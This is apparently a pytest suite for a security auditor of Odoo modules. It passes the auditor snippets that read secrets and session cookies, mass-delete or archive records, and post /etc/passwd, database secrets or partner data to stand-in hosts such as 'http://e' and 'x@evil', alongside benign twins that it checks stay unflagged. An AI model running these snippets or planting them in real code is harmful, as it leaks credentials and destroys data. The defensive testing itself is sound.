"""CODE-AUDIT-15: REVIEW-CODE-AUDIT-12 (6H/3M/2L). Each class is fixed structurally (taint/alias
models), not per variant. Each finding: review probes, bypass variants, benign twins."""
import pytest

from tests.test_nf_bot_code_audit_11 import _m, _sev, _js, P, O
from tests.test_nf_bot_code_audit_14 import _ctl, _comp5


def _qt(body):
    return {"report/r.xml": f"<odoo><template id='r'>{body}</template></odoo>"}


# ---------------------------------------------------------------- H1 secret taint sources
@pytest.mark.parametrize("body", [
    "from odoo.tools import config as c\nx = c.get\nreturn x('db_password')",  # probes
    "import odoo\nreturn odoo.tools.config.options['admin_passwd']",
    "return str(config.options)",
    "return str(os.environ)",
    "return str(dict(os.environ))",
    "return str(request.session)",
    "return getattr(request.session, 's' + 'id')",
    "return request.httprequest.cookies.get('session_id')",
    "g = config.get\nh = g\nreturn h('admin_passwd')",  # variants
    "e = os.environ\nreturn repr(e)",
    "s = request.session\nreturn str(s)",
    "return request.httprequest.cookies['session_id']",
    "o = config.options\nreturn o.get('db_password')",
    "return {'env': {**os.environ}}",
    "k = kw.get('a')\nreturn str(getattr(request.session, k))",
])
def test_h1_secret_taint_route_high(body):
    assert "high" in _sev(_ctl(body), "route-secret-read")


@pytest.mark.parametrize("body", [
    "return config.get('addons_path', '')",
    "return os.environ.get('TZ', '')",
    "return str(request.session.uid)",
    "return request.session.get('lang') or ''",
    "return request.httprequest.cookies.get('frontend_lang') or ''",
])
def test_h1_benign_twins_silent(body):
    assert "high" not in _sev(_ctl(body), "route-secret-read")


@pytest.mark.parametrize("body", [
    "<t t-out='request.session.sid'/>",
    "<t t-esc=\"request.env['ir.config_parameter'].sudo().get_param('database.secret')\"/>",
    "<span t-out='request.session.session_token'/>",
    "<t t-set='k' t-value=\"request.env['ir.config_parameter'].sudo().get_param('database.secret')\"/><t t-out='k'/>",
    "<span t-att-data-x='request.session.sid'/>",
])
def test_h1_qweb_secret_output_high(body):
    assert "high" in _sev(_qt(body), "template-secret-output")


def test_h1_qweb_benign_param_silent():
    assert "high" not in _sev(_qt("<t t-out=\"request.env['ir.config_parameter'].sudo().get_param('web.base.url')\"/>"), "template-secret-output")


@pytest.mark.parametrize("body", [
    "import logging\nlogging.getLogger(__name__).info(self.env['ir.config_parameter'].sudo().get_param('database.secret'))",
    "import logging\nlg = logging.getLogger(__name__)\nlg.warning('%s', self.env['ir.config_parameter'].sudo().get_param('database.secret'))",
])
def test_h1_logger_sink_high(body):
    assert "high" in _sev(_m(body), "secret-exfiltration")


# ---------------------------------------------------------------- H2 field-assignment writes
@pytest.mark.parametrize("body", [
    f"rs = {P}.search([])\nrs.active = False",  # probes
    f"for p in {P}.search([]):\n    p.active = False",
    f"for p in {P}.search([]):\n    p.email = ''",
    f"for p in {P}.search([]):\n    setattr(p, 'active', False)",
    f"{P}.search([]).active = False",  # variants
    f"rs = {P}.search([])\nfor p in rs:\n    p.name = 'x'",
    f"rs = {P}.search([])\nsetattr(rs, 'active', False)",
    f"for p in {P}.search([]).filtered(lambda r: r.active):\n    p.active = False",
    f"rs = {P}.search([])\nrs.email += 'x'",
])
def test_h2_field_assignment_mass_change(body):
    assert "high" in _sev(_m(body), "mass-change")


@pytest.mark.parametrize("body", [
    "self.active = False",
    "for p in self:\n    p.active = False",
    f"rec = {P}.browse(self.env.context.get('active_id'))\nrec.name = 'x'",
    "self.ensure_one()\nself.partner_id.name = 'x'",
    "o = object()\no.active = False",
])
def test_h2_bounded_assignment_silent(body):
    assert "high" not in _sev(_m(body), "mass-change")


# ---------------------------------------------------------------- H3 view-state domain aliases
@pytest.mark.parametrize("body,d", [
    ("wipe(){ }", "(() => { const d = [...this.state.domain]; d.length = 0; return d; })()"),
    ("wipe(){ const d = [...this.state.domain]; d.length = 0; this.state.domain = d; }", "this.state.domain"),  # probes
    ("wipe(){ const {state:{domain:dd}} = this; dd.splice(0, dd.length); }", "this.state.domain"),
    ("wipe(){ const o = {s: this.state}; o.s.domain = []; }", "this.state.domain"),
    ("wipe(){ const st = Object(this.state); st.domain = []; }", "this.state.domain"),
    ("wipe(){ ((s) => { s.domain = []; })(this.state); }", "this.state.domain"),
    ("clear(s){ s.domain = []; } wipe(){ this.clear(this.state); }", "this.state.domain"),
    ("wipe(){ const d = this.state.domain.slice(); d.splice(0); this.state.domain = d; }", "this.state.domain"),  # variants
    ("wipe(){ const d = Array.from(this.state.domain); d.length = 0; this.state.domain = d; }", "this.state.domain"),
    ("wipe(){ const [...d] = this.state.domain; d.length = 0; this.state.domain = d; }", "this.state.domain"),
    ("wipe(){ const o = {...this.state}; o.domain = []; Object.assign(this.state, o); }", "this.state.domain"),
    ("wipe(){ helper(this.state); }", "this.state.domain"),
    ("wipe(){ const {state} = this; const {domain} = state; domain.splice(0); }", "this.state.domain"),
    ("wipe(){ const h = [this.state]; h[0].domain = []; }", "this.state.domain"),
])
def test_h3_domain_alias_high(body, d):
    assert "high" in _sev(_js(_comp5(body, d)), "js-mass-change")


@pytest.mark.parametrize("body", [
    "",
    "wipe(){ const d = [...this.state.domain]; console.log(d.length); }",
    "wipe(){ const o = {s: this.state}; o.s.limit = 5; }",
    "wipe(){ console.log(this.state.domain); }",
])
def test_h3_benign_twins_silent(body):
    assert "high" not in _sev(_js(_comp5(body)), "js-mass-change")


# ---------------------------------------------------------------- H4 + M3 runtime model / props delete
@pytest.mark.parametrize("src", [
    "class C extends Component { async go(){ await this.orm.call(window.m, 'unlink', [[1]]); } }",  # probe
    "class C extends Component { async go(){ const m = this.props.m; await this.orm.call(m, 'write', [[1], {active:false}]); } }",
    "class C extends Component { async go(){ await this.orm.call(`res.${window.x}`, 'unlink', [[1]]); } }",
    "class C extends Component { async go(){ await this.orm.write(this.env.model, [1], {active:false}); } }",
    "class C extends Component { async go(){ const o = this.orm; await o.call(window.m, 'action_archive', [[1]]); } }",
])
def test_h4_runtime_model_destructive_high(src):
    assert "high" in _sev(_js(src), "js-sensitive-model")


def test_h4_runtime_model_read_not_high():
    src = "class C extends Component { async go(){ await this.orm.call(window.m, 'read', [[1], ['name']]); } }"
    assert "high" not in _sev(_js(src), "js-sensitive-model")


def test_m3_props_delete_high_outside_controller():
    src = "class C extends Component { async go(){ await this.orm.unlink(this.props.resModel, this.props.resIds); } }"
    assert "high" in _sev(_js(src), "js-sensitive-model")


def test_m3_props_delete_in_list_controller_medium():
    src = "export class MyListController extends ListController { async go(){ await this.orm.unlink(this.props.resModel, this.props.resIds); } }"
    sev = _sev(_js(src), "js-sensitive-model")
    assert "medium" in sev and "high" not in sev


# ---------------------------------------------------------------- H5 outbound exfiltration
@pytest.mark.parametrize("body", [
    f"import http.client\nhttp.client.HTTPSConnection(self.name).request('POST', '/', body=str({P}.search_read([])))",  # probes
    "import urllib.request\nurllib.request.urlopen('http://e/?' + self.env['ir.config_parameter'].sudo().get_param('database.secret'))",
    "import requests\nrequests.Session().post('http://e', data=open('/etc/passwd').read())",
    f"import smtplib\nsmtplib.SMTP('e').sendmail('a@b', 'c@d', str(self.env['res.users'].search_read([], ['login'])))",
    f"self.env['mail.mail'].sudo().create({{'email_to': 'x@evil', 'body_html': str({P}.search_read([]))}}).send()",
    "import requests\nrequests.post(self.env['ir.config_parameter'].sudo().get_param('x.url'), json={})",
    "import requests\ns = requests.Session()\ns.post('http://e', data=open('/etc/passwd').read())",  # variants
    f"import requests\nrequests.get('http://e', params={{'d': str({P}.search_read([]))}})",
    "import socket\nsocket.create_connection((self.name, 80)).sendall(open('/etc/passwd', 'rb').read())",
    "import requests\nrequests.post('http://e/' + self.env['ir.config_parameter'].sudo().get_param('database.secret'))",
    "import requests\nurl = self.name\nrequests.post(url, json={})",
])
def test_h5_outbound_exfil_high(body):
    assert "high" in _sev(_m(body), "network-exfiltration")


@pytest.mark.parametrize("body", [
    "import requests\nrequests.post('https://api.example.com/v1', json={'n': self.name})",
    "import requests\nAPI = 'https://api.example.com'\nrequests.get(API, params={'q': self.name})",
    "self.env['mail.mail'].create({'email_to': self.partner_id.email, 'body_html': self.name})",
])
def test_h5_benign_outbound_not_high(body):
    assert "high" not in _sev(_m(body), "network-exfiltration")


# ---------------------------------------------------------------- H6 ids via map/lambda/generators
@pytest.mark.parametrize("body", [
    f"self.env['res.partner'].browse(list(map(lambda g: g['id'], {P}.search_read([], ['id'])))).unlink()",  # probe
    f"{P}.browse([g['id'] for g in {P}.search_read([], ['id'])]).unlink()",
    f"{P}.browse(tuple(g['id'] for g in {P}.search_read([], ['id']))).unlink()",
    f"{P}.browse(sorted(r.id for r in {P}.search([]))).unlink()",
    f"{P}.browse(list(filter(None, map(lambda g: g['id'], {P}.search_read([]))))).write({{'active': False}})",
    f"ids = list(map(lambda r: r.id, {P}.search([])))\n{P}.browse(ids).unlink()",
    f"{P}.browse({{r.id for r in {P}.search([])}}).unlink()",
])
def test_h6_collection_built_ids_high(body):
    assert "high" in _sev(_m(body), "mass-change")


def test_h6_bounded_map_silent():
    assert "high" not in _sev(_m(f"{P}.browse(list(map(int, self.env.context.get('active_ids', [])[:1]))).unlink()"), "mass-change")


# ---------------------------------------------------------------- M1 t-call taint precision
@pytest.mark.parametrize("body", [
    "<t t-call='x.u'><t t-set='a' t-value='is_view_active(\"x\")'/></t>",
    "<t t-call='x.u'><t t-set='a' t-value='keep(search=0)'/></t>",
    "<t t-call='x.u'><t t-set='a' t-value='product.sudo().rating_avg'/></t>",
    "<t t-call='x.u'><t t-set='oe_structure'><div>hi</div></t></t>",
    "<t t-call='x.u'><t t-set='search_term'>Search in</t></t>",
    "<t t-call='x.u'><t t-set='u' t-valuef='/shop/{{ slug }}'/></t>",
    "<t t-call='x.u'><t t-set='i' t-value=\"env.ref('base.main_company').id\"/></t>",
    "<t t-call='x.u'><t t-set='b' t-value='request.env.user.partner_id == partner'/></t>",
    "<t t-call='x.u'><t t-set='w' t-value='request.website.get_current_website()'/></t>",
])
def test_m1_tcall_noise_silent(body):
    assert "high" not in _sev(_qt(body), "unsafe-expression")


@pytest.mark.parametrize("files", [
    _qt("<t t-call='x.u'><t t-set='s' t-value='request.session'/></t>"),  # unresolved target keeps HIGH
    _qt("<t t-call='x.u'><t t-set='e' t-value='request.env'/></t>"),
    _qt("<t t-call='x.u'><t t-set='c' t-value='env.context'/></t>"),
    {"report/r.xml": "<odoo><template id='u'><t t-esc='s.clear()'/></template>"
                     "<template id='r'><t t-call='m.u'><t t-set='s' t-value='request.session'/></t></template></odoo>"},
])
def test_m1_true_tcall_alias_high(files):
    assert "high" in _sev(files, "unsafe-expression")


def test_m1_resolved_callee_benign_silent():
    f = {"report/r.xml": "<odoo><template id='u'><t t-esc='s.get(\"lang\")'/></template>"
                         "<template id='r'><t t-call='u'><t t-set='s' t-value='request.session'/></t></template></odoo>"}
    assert "high" not in _sev(f, "unsafe-expression")


# ---------------------------------------------------------------- M2 comprehension alias in QWeb
@pytest.mark.parametrize("body", [
    "<t t-esc='[s.clear() for s in [request.session]]'/>",
    "<t t-esc='{k: s.pop(k) for s in [request.session] for k in [1]}'/>",
    "<t t-esc='list(s.clear() for s in (request.session,))'/>",
    "<t t-esc='[e.clear() for e in [request.env.context]]'/>",
])
def test_m2_comprehension_alias_high(body):
    assert "high" in _sev(_qt(body), "unsafe-expression")


def test_m2_comprehension_benign_silent():
    assert "high" not in _sev(_qt("<t t-esc='[d.name for d in docs]'/>"), "unsafe-expression")


# ---------------------------------------------------------------- L2 path normalisation
@pytest.mark.parametrize("src", [
    "fetch('/web/dataset/call_kw/RES.USERS/WRITE', {method: 'POST', body: '{}'});",
    "fetch('/web/dataset/call_kw/res.users/write;x', {method: 'POST', body: '{}'});",
    "fetch('/JSON/2/res.users/write', {method: 'POST', body: '{}'});",
])
def test_l2_path_variants_flagged(src):
    sev = set()
    for code in ("js-raw-orm-request", "js-sensitive-model"):
        sev |= _sev(_js(src), code)
    assert sev & {"medium", "high"}
